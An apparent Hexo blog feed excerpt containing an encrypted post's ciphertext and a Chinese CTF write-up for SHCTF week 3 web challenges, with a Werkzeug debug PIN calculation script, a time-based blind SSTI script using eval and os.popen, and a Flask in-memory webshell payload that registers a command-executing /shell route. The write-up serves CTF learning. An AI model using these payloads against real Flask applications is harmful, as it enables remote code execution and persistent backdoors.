e623f2b3096ee1258bd1af63ce8d15c3e3b6f40126c785d414d15ee376072abc7cbd3efd8e8dd28768dd626bac8c02150626fae9104677bd2a53dc76ffd272712639b1244f9afcad1e9d73c5ff30dc46a3716feb4417b056b84acd13e4b8ff8ee482045dfe01bf66743918a16faa64f9bc945c90e59843ea682589e09ac6919901048a34db9f505eb06e8dfe5acc69a7e952f9c7011209ac9135a2c683d11f9e55d39940a8f30d04026f4d41123c6112f4587b21769b340b3316c1f079d5d567d4696d0d245c5c2d4bf32be8c73c348859d1a941d4ea6045513a0c48e1f6c9c5565090216f7ea1f91fe731e0f45b8345e4638682aa694a377f52512e0d7697ed10710caac7a23add34ed9af59ee7bdecbaf5c5f3b45833f84b81f6da59708f9820170d7a0659475d921bf081591465995ca96538bca9d6e867ac3f347ddea366ace14125383df8c95e50848e65b284a2cdb52b5dec08fa8960bd7e255cd352b258e7a9bc601fac5499199e0b74d9d7e3e3501ebd99f4bb58d5b76d0cc68e28692e09a82b5c1e31eef3b7d60b416514f68234af923f569899333b21a3e9e1414a57d928b41ad803c4d674b3837d707a637ddc5bf0acfe6dfd97d2de56c07dbe195171e746aa80225dacf9da770535790d74770372bd8e12aa966bd4a8fe09551b60e373a5f65f18035a7624f0b5d4d5022a89697faa443cb475bd419fcd3a2df8d36a9d47c9c0fb143d373cc8d2ab75ceefb3b4dc3a78eb53de744747e55a96a4eb59d9e89aaf77b330bdaaf5c1790758a0a86f158c11bf6463c2b799cc31997cb057659253e7c11023250d0396d665d8af88ced99bc0ab00a71b90e09a650ee900e8bddcf3489a194ee0aaba7930a45fff1a5da5ce92ce4b8243a8560e685af7e4483907c772322834ea47e367b245148eb0b2c523021e5abca37a91cfbbb4619b586cd8f46cc3bf550d1794561866e3f0c9060c60d4113d0841df01659f214018742ae1d9dd7bc39ad4d72f50c46c4b42e2847a4684edf9d2d73eb50e9221bdab43ba3139a0658f06f27a9e59dbea094eace604262177420bf40a70451eebea587c8d218a64fb4d2f4d92a5c60ff71b0e9833f32ccb6140e846abc7e21f2f7f765f95139aeefa4f10954853ceca352376bd957d5404baf06c05f308d65899dee4f543e0abba819f9f0c2e105dd8c43ed1e6a04e1b4fb1e8331475d6c8db09b248330f717c590dc8080966b4bb0ac87e78735e765f2cea71a5e4065ddb71e96f1beb4cf2728257c329f1c0ee05416ad021e8d6dd85f25c8df68c2ee55b1ecd324e058eb025d35901b6624c5734d5aedfaf6e6d8c7deb846ce12a7e849ec872bf656bf3dab7f19680a4a6de392294ac71d5f5dc9a20dd513054da463dccf120c203362b5af431c9ce5ea39f88f8531bab2091a6f9f213ed0a44b7e0c9634cdc1121f41a8421e0707919bb83078a9e1e03938f005200e3c6f571dd1619b91769c30a66d4c7f8b47e23069ea48d003488bbcb443c356cf980708b655dbb68cce492e5c54800532198e9d29d9f957c371cb68c93f33911614165a80ba80972a9d1bfbf1d8d9eab4f52445831d06d0f33b61970ccd760b8c33c1c638494dbfd9cf9c4045ad46d52c748a2ad570ca0e43164adee0627183eb7e8b5e3fda1e34d84b6b09fac1b21c20b069f482ecbca0b2e2bf21a6c76dc64aad36428006e34da4c344b9e963b45223bb81b99c85b87221d2355801697d5181d79701302ecd0f94d76c1650a39be31598b4ee4efb328e4ddc960e261c606ed76d105d1983e241e09626c0250c915f31725d0ce9976546d1d8cdce184b8dc303a7b4896465c37515b922d81127467cd724f293b8a9049e95859342a9dea20a96dd49bdd995fb84b38d5ce0207a30c8e6f0cf67f38552ede352ecc86dc9691fb15f75db48163de16d47ed6d4a0b04a74461081dd17c69f5201163ba806720802debf8982e8f37619f4943ea6a74e7c6a194d465429694b248fe3f7c26dd719d67d4a655b86ae796cc0ecd7b7a7c058c67c0ec8053f1fab4189df513b54e606e3eb842e3ac993158305ffef4f4500d14b577ae831cdc5a184c1ba2b40065772a7f1c6330d98cb23361438dca585ac28d917c3a46afc38a85702ed18c255383d6db659205cbb9f070d56115e47f62b37d4dbf0350b2c7eaebb69353d97dad87f89ca6b212261a40d5b7ab97e48e3e9b464379bf31aa4cf99653d13e031b68ae77ec2df391a14bf6cf66dac9acca30c2138f3f20e2d7536945388e6cc11b4ba0ec1a58d83fd24f17e9ccc8a9a5613811540077226b563bf7d7f15c69f0caa53b9df7f33ef23c2e603581d336c934e7abd4e1368d8c1bf86b8231c536bddee7a8468e6be2529d56ebbf136eec121b67466609478c1a553573aabd54609b4e405ea1d003c33de2531b34ecf45af9fe29d6ac99e8413090f945a2109d3d214fa185f0272d0784d62c70c35d69bbfed55836217e43c97076b5b31eef5cbff7dac95aea29c0a584e3e232e195410490ff32ebc1bd0ea7ab301d3096700337b01bdbbea418ac3083d5e9161f441ce9e5532351f16a4013bff4357b1ead912da4936f0358bec0a50e3ee6e8e3251b93462b5a0ebcef8f9b5e3921c96e02de0f791e3f71fd4145a7dd3e52ca20af61dc1b11af2c865dffff644cbb544bd6d6e8aa7aa567487044aa4bb31f39d2692f71b01c2e8e98e8e70a5392d9224411da203048b4b74dd6bf16ae3a16b7ff3bfa7984cd2127d72e5796f1ae82174730cc072a2e073991534911fea8b6b60fcf568cb0a8d677824b6a0bb455d5f9d7dd7239e4cc72883a88677b12fb46734a76d57d9eac01c732ee1e4f8bbc01a6bb5a46097383a78606639ec3b743c703d880a2c91be43258e21a3a09604f9171dab3965afd2d2b23f123ad0aa96b4bc89969e2ebbedfb5ca99c6f8aedc31d4269792ec9865987dc474a205da86f1fabcf7ddb93cf89c44f9f4aebe3636ce5cd0ac1d9d32964c22105590f7ed6bca1355189d6372ee505730077aee4936f4966167de632f4e253b5d75f5007f746ed0d85f667686c1a3b51afd300699964f0f7d3e334053f2391396c956e525bd799f8bbdb2ad411f9fa7b98660a99cef048c1ab0e0f91fd263f67e308ed250fd0932d3bb1fd9aa0d0f8469798061e2e727cc920176cf3c62850ac26f7cfb9f97ab04d42c6bad8bcbda76a1b6de469511af361e637c85cdd92b8f0a0bf64c8427925fb2898a6a88605e0770a1805c57e4d8a484c92091745a72aabfb0d6985cd2af66dc0174678035267939747f72ee9933dec20423a6bd6d549e5cfa89b4a00a1fa6a8c9a8bced259f85b4278aede0f7866970320c6583ed9e4568046938d549a462b8db56ac1656adb25aa2fdba5994b74daefe0e674200f1f4bceadc3dac37374b285b2128383414cc7b413a95f3a494c76d3a9e8773e367f9bd5c8dda60e5e64a991eb75c43b1d40f2e6684feed09f02a3a2ddb20d98ec3f43a16da686b2b8a4183e87ac2c2677d887a07dbe865bb54c87e5e6d54ca67369b229422f970903cd7d5a9017bcc71588ab2cc863e1a31726258163f5480240ec964ef5ce845e98e2a80f809aa1201dd72942821c39f854cfec3b39d3fd4f7add15fdb6988bf6fa8282f7c9c222f70801101430f4b00b03f4b76b4e28d81826fb078e9db0e9ed723bc7d27788b0cf411364a2af8d9615336b6eb1ebf401fbb7703cc15e48de907530b7d36c6b3e17e9b223616029240107c965d389184c9df1289383f56bb1d0869ab04a54808cbd02620bbc5772ed82f5b6259feef111db4932c79be202f5bda8f729e3df488ed3a9aeccfe90bf4b5408a2099cf2051ad75041b818540cab15e6f45380f15e2ae1ba6a06cbb15b38d84d4e31b5a44e2e668a6b338f1699fbb1324cfe2acd3e366da8c9e9b4a2d497596ddbc09377beb403ad310658b855f96c28d6ee18b4ec997f63852f7683ae4c118978a49e1dcff0ae32277babd983ab0e424449de39ff0990f2342bf45e82d863a40af2f5ed59d5c39bff80294b60f3d4e30702dd1a709334a1f37d11167f894404c94e330a5bcd90a6795f947b6d5f1da5cfbd0dd620731b0d82d7e10c72009d353e476fad6e3dc9c13a3b4bf8ac86e5c19e75095724fa7a46a2861023d57e9a79cda47948189a2bae73177cc42ed5c656bedf4f7c404a2b5899d4ffda9f6ca264d36e0c7841eb775d75b23417554d8f643860590aa51d2a319105a2ad5b7f9740da844046ff2c8a6818fa59360e30386528fd6d874aa43707bca664212fc831ad6b9dc6187d5ce82aab3d9da0908e0b981405d1bbcde713947b3afcfbe525837814cfd673195a60bc7a40a69fce0c5ff87498a4b435e5422b21cff67201652db076a604ee4060f28d5c7c1adf459b861e2876a6ce9045b9803031ed16ec1e9f62a0d3a57eda92280ebe79e3d11f9fc7ffdf6e99a882115a9f363df3ce206f8c3e5181995c5a8d67c24b669f9ccc1b68ced938efd03439a587264ea1d4aad1a9ee137421231ecfeb21050cfd9710f9ee60af16be530ea74cc6168cddec6e6c76d16b0f73e959b914399cf92c8d5415cda435ff0f397402c2da4efac554959cd9c996c35c0042f7a0aa02e91bc8c1d1a18d22c0521403706639dbea79ba51830ae8eea05ed47d8d349d00e855996c6fa35e117ca2f672b623d5adbb6170effdffb6079c406d41f9582fb80bbb4ceaa48d2d2dac7cf6a786921f9a2d5420ed35723dc7522b54db532a7547aa3d6ddbce428c34f9852e35de2a4b476cbaba87f94f30ea5ede16b24105a3c6700d9f8641fa6882593c9107cc56b184d0bdcef19eed12a37d911d5473f396d31fc0c6a97fa8181f4547fbdba1749098aac8395acbfc51febc0c35c829771730450018511192e72c7a74d378f1bc9d1767f28a11c82f74ee5cba81079fa40e71271743de64a9729c5ca92d646ab6ac963b3192ab2a66aca57cbd88402fe3bccb7deceb3a4ddb3c0235fdebc247e76d931b7104788df26518c15199cac5d66f9b139ede089a35b5167dadaf892278a558127ba7bd1a0cc4120c5d6c1ac91a5a2e8be49922cb587d59fa28f3daeac034920fac9e0b922720264b1cdcee988a00aa49b2561160dcc3f7d61798b5e6ed424ec393686745486567bf29402300497624e79eff04d5e77cc410a53d7100767091e29e185ad2c0b6cae5b4df3f228d056184cd1c7b03b9601599102137dfc34f128bd01f6f52682ac3e91eaabb1f0a3a595facc2491d130cdeae224245272ed99637ed1d9848010aa5435298aeddf9f46181606b494730771198b802c1da4bb245e4fdffbc691463156f501170aa0136a54bac361a11032a6945f0ca31c6f498f81e71d7c4f19aee6313e6c2df2232723163096046bfd0ce218319c848d62faae1742549b51505cd1c2ff460d6d5e46df885601eaa2037c0ca6883434970189cda3e5a0d7f6512d19c7de1914eaeea07067df3763f4d29ae6d04eb4eab6562da2c7d03a94a7d9fcbbcc1512f157944e0d8f135b361f7ba11c8bc488a244a1438199b71c10b2c3e8144af2e720c8f9f4d61d6876aa7ce8386fa678b673501814aa48cf5ffc854f42a380a42c0f4f63333d13a2b67f252f2213a6066d9a463c175dd6a9b2777ad4e00780b32aef0179e68c525c94ce51d6b6a69d7b23e710c62991ca1eb4c7ed7c68235f6e6afe33807868100087ff67b29cc903f592b0265484e3b7851bc7d8123606792328df1de5e7c124507dc2d1115fd4f3125cb1e44c6eb7d30cc7b7f9615f5fb72947c4ad99493040b31ae1ac81b085f697672ff5a839aaba3b9bb8cd21ee9cfaa27658b153cf326fef3216eea99b4cf4acd4ac9b217f29e7b4b833e41200e1c8834fe2e0acb50d164e05466b9100e5d9c9bdde4c1887110028bab096847a11f82a8afe755c5c06c82b872af359bbe4c91cf9e5a44d109e350217545c02aac6b54c54792d140701d7859ce4180eb552e57fac3fb91ee4dca629fdfc975cbcb6fd9a9560716c94ff301759924e92c0ae397ed1abdd79ab092a24d442398f46bd6c52a6f7d961b507e1efa2a915e2c2db6f0b26228ddd7e990c5bfa566b826f2547d37cd9708b4381c2d9cb36c84de28c36fa45a44a505b03db47bcfa9e35fca2af0fa4c20f694f7508a4475150c4db6f6f63576a53101590a2b6737debdbf2dfb9eb185d8372150424c16f4d3f191827419c309a9cf2859e99d1c44406685861d44708b164ebcc97d1461f7c2147175e24501db0b5b10c479b3db8381470faf0927a35b2d513709b9f1471a38e3fbdafb671f5f36a4340db09f21e2a642024e2a81a96931e8e4c563431ad79e5cd3609611a0b06ba5dc869834cd2158d7ef0f4b4bc8f1e317efb23f217e49b2b515b3bd650d6c312d66702b27ed36b5072cb05d13ec52b84940ada417101b11b1377476137e06bde50553613e88033ab2f0c0d750e07ed938cbd2e707f9b8c291cce32bb2f0bae8c5287ffe14fa58f7911bd84c1907f8c76f07ddd3d97d82a4631603bb2217dd8a9b5307c77dac0475bbf6c0d6380bde9e35fe8b45cb9008a6b32c3c89f7f319962a8ae72ff90e970309331189a86d65bab04a59cf750ef8751253f91307593fe06d2e093bcbce99b770870074f5ce16ab82afad4c9fd281e6daae44033ff12166577437bb3dfe51793078ae81ba7895bbdb741ab13e746553486b53c100c40e04f867c0ce3fac7612124783e76af297dfbe7ad40b6da20fd116598a5b21b10eeea8f7e2be49d2f60a1db4c00109de5843b44cfff41718d6903db055915862dee503c6336d224e31f5b9e07609b26296131a7c455b42df3753baf64bd048024fcc7b06488063a1f0a538afdcc853b6eb70440aed5b01b28e65020ce58c03fffdaac2edf5f0c80cdabd5609c36275416c9b6a5b3948f8ee92e5919b2e6e519141094e9ad52db70077bf82945c860e3f17d2fe8743e5b16e24c77d8231ea3d46d31b9150d9d7d298c2c2be1c6b097b2900c1d0caebdbef08eaf4c039aa54bc845d1deb1d9fb664d75aee3e6642c527ae9593cb65cad6ec6541fbe27ffadde3aa4f56d3e4298c3748c9a7938b0b32afaf780a88474fbef72437a4b34b80b32265c2ae350cd7def0ada3f593e87d8efdf1c35cbfc47de7237b432246a0be4c9df746412c9ec6df75c0a5aa56c130ecae90a0080410bc6799f00fc596025e4779e01d6f29e1c001a13c9e3d0531d90101bae23b75f8b355cb043fc9e935be07cb08fbc74f8da096a26e153f35b0d40c129e3cc42732bfa1bbd0b59611fbe8c275ab27676e793d6d5cf5b23f971bd5826f380ff13cfbd369e96bab98f74547fb39992b2495b59ae1bcd501076db1d9261e3b9fee06b517bad4159cf1049e54f021e0b791708f2860d03925d1b406359a3272f56b89c668444954d69d3d1a7a7446f66ea0e70057419670ea092568b3238fa0438bd5133350a9aa1cb50d00e47fa534a3cea0954e4ac8a45b3e30266f6523ea262b60dcad1644828a126d16208a68e29323e1e7ad8363ec44ef728cced9d9ee67024c39a4d1242bd31e652ac81c4d00bf9e4859a10510e7de8185add1ed4b4453db2474b158f6b83a8e714ea378dbc036339082cb434741bccee84387579b9ea2b5a1c788f0aec89030d3f4b8e2650453c4f89abe0301e415f1d09cf6316ca3e54609957db6fec1e35da8c85bce3f9bcdd75ca99bc7f4002ef6b6027ea6194db1f2e9b83c208306ed47dba1e402dfebbad225f7c538fd2a9924994f1eb8dee0b1d1a23e3e2ec9635766e250644aeb9a66a77e54299509</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">无密码 方可以忘记它</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Dig</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shctf week3-web</title>
    <link href="/2024/11/22/shctf%20week3/"/>
    <url>/2024/11/22/shctf%20week3/</url>
    
    <content type="html"><![CDATA[<h4 id="Week3-顰"><a href="#Week3-顰" class="headerlink" title="[Week3] 顰"></a>[Week3] 顰</h4><p>flask算pin</p><p><a href="https://werkzeug.palletsprojects.com/en/3.0.x/debug/">https://werkzeug.palletsprojects.com/en/3.0.x/debug/</a></p><p><img src="/mdimg/shctfweek3/1729266690801-395eed80-cf41-4f9a-8a4e-31df30d5b859.png"></p><p>对<code>debug console</code>的请求需要来自信任的<code>host</code></p><p>添加header <code>Host:127.0.0.1:port</code></p><p><img src="/mdimg/shctfweek3/1729612399989-3ef3fabc-1e6e-4e12-a3f4-4a5b9e43d427.png"></p><p>因为每个请求都要host</p><p>所以写一个demo抓包来获取提交pin验证的参数以及执行命令的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;test&#x27;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><code>?__debugger__=yes&amp;cmd=pinauth&amp;pin=119-178-555&amp;s=1aobhiUuRbIB9bPSOM2Z</code></p><p><code>（这串为SECRET = &quot;1aobhiUuRbIB9bPSOM2Z&quot;;）</code>看源码能找到</p><p><img src="/mdimg/shctfweek3/1729661002711-89c9e5a7-3ab8-49c7-8fe5-56cff0c6a73d.png"></p><p>算pin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_decimal</span>(<span class="hljs-params">mac_address</span>):<br>    <span class="hljs-comment"># 将 MAC 地址分割成十六进制对</span><br>    hex_pairs = mac_address.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 初始化十进制数值</span><br>    decimal_value = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># 将每个十六进制对转换为十进制并累加</span><br>    <span class="hljs-keyword">for</span> hex_pair <span class="hljs-keyword">in</span> hex_pairs:<br>        decimal_value = (decimal_value &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(hex_pair, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-keyword">return</span> decimal_value<br><br>mac_address = <span class="hljs-string">&quot;42:a8:3c:60:79:d0&quot;</span>  <span class="hljs-comment"># /sys/class/net/eth0/address </span><br><br><span class="hljs-comment"># 调用函数将 MAC 地址转换为十进制数值</span><br>mac = <span class="hljs-built_in">str</span>(mac_to_decimal(mac_address))<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span>  <span class="hljs-comment"># username 可通过/etc/passwd获取</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span><br>]<br> <br>private_bits = [<br>     mac, <span class="hljs-comment">#mac地址十进制</span><br>    <span class="hljs-string">&#x27;d45a88e1-3fe4-4156-9e59-3864587b7c87&#x27;</span><br>    <span class="hljs-comment"># /proc/sys/kernel/random/boot_id + /proc/self/cgroup  (name=systemd:) /proc/self/cgroup为空不用看</span><br>]<br> <br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br> <br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br> <br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br> <br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br> <br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p><img src="/mdimg/shctfweek3/1729661141325-7161cd57-a5fc-4a6c-9700-98dfb503248d.png"></p><p>获取cookie</p><p><img src="/mdimg/shctfweek3/1729661406342-11fab662-f2fe-466e-8124-7c49911da395.png"></p><p><code>__wzd7601fb13e6a573dccdb2=1729661381|c7574ed074d1</code></p><p>根据demo获取传命令的参数</p><p><code>/console?&amp;__debugger__=yes&amp;cmd=open(&#39;/flag&#39;).read()&amp;frm=0&amp;s=1aobhiUuRbIB9bPSOM2Z</code></p><p><img src="/mdimg/shctfweek3/1729661581454-83b2b45b-8ee6-4eda-a80e-a816e7101eaa.png"></p><h4 id="Week3-love-flask"><a href="#Week3-love-flask" class="headerlink" title="[Week3] love_flask"></a>[Week3] love_flask</h4><p>看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pretty_input</span>():<br>    <span class="hljs-keyword">return</span> render_template_string(html_template)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/namelist&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name_list</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)  <br>    template = <span class="hljs-string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % name<br>    rendered_string =  render_template_string(template)<br>    <span class="hljs-keyword">if</span> rendered_string:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Success Write your name to database&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Error&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>输入可控+渲染，明显ssti</p><p>但不同的是，没有return，也就是ssti的结果没有回显</p><p>可以看到没有任何的过滤</p><p>由于这里是格式化输入变量name，所以用不了条件或循环控制语句<code>&#123;% if %&#125;``&#123;% for %&#125;</code></p><p>所以有2种办法</p><p>第一种</p><p>是盲注，因为渲染失败会返回500，所以可以根据返回状态码先爆出eval</p><p><code>/namelist?name=&#123;&#123;().__class__.__base__.__subclasses__()[&#123;&#123;int(100-200)&#125;&#125;].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;time&quot;).sleep(3)&#39;)&#125;&#125;</code></p><p><img src="/mdimg/shctfweek3/1729508104331-d82a3493-6526-49aa-8062-ee20ec4bae55.png"></p><p>接着通过构造延时来爆flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>flag =<span class="hljs-string">&#x27;SHCTF&#123;&#x27;</span><br>table = <span class="hljs-string">&#x27;-ABCDEFabcdef0123456789&#x27;</span><br>url = <span class="hljs-string">&#x27;http://210.44.150.15:25528/namelist?name=&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">43</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>      ii = flag +i<br>      start_time = time.time()<br>      data = <span class="hljs-string">&quot;&#123;&#123;&quot;</span>+<span class="hljs-string">&quot;().__class__.__base__.__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;if [ $(head -c &#123;&#125; /flag) = &#123;&#125; ]; then sleep 2; fi\&quot;).read()&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>,ii) +<span class="hljs-string">&quot;&#125;&#125;&quot;</span><br>      <span class="hljs-comment">#print(data)</span><br>      url1 = url + data<br>      r = requests.get(url1)<br>      end_time = time.time()<br>      response_time = end_time - start_time<br>      <span class="hljs-keyword">if</span> response_time &gt;= <span class="hljs-number">2</span>:<br>          flag = flag +i<br>          <span class="hljs-built_in">print</span>(flag)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(flag+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>第2种</p><p>内存马</p><p><a href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a></p><p>内存马无需上传文件也不生成文件。内存马通过动态注册一个路由来作为执行命令参数的入口。<br><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;</code></p><p><img src="/mdimg/shctfweek3/1729512984456-c5c0b8c8-9e32-493e-858d-f0e4ac7edb9e.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BRICS+ CTF 2024 web/villa复现</title>
    <link href="/2024/10/11/BRICS+%20CTF%202024%20web/"/>
    <url>/2024/10/11/BRICS+%20CTF%202024%20web/</url>
    
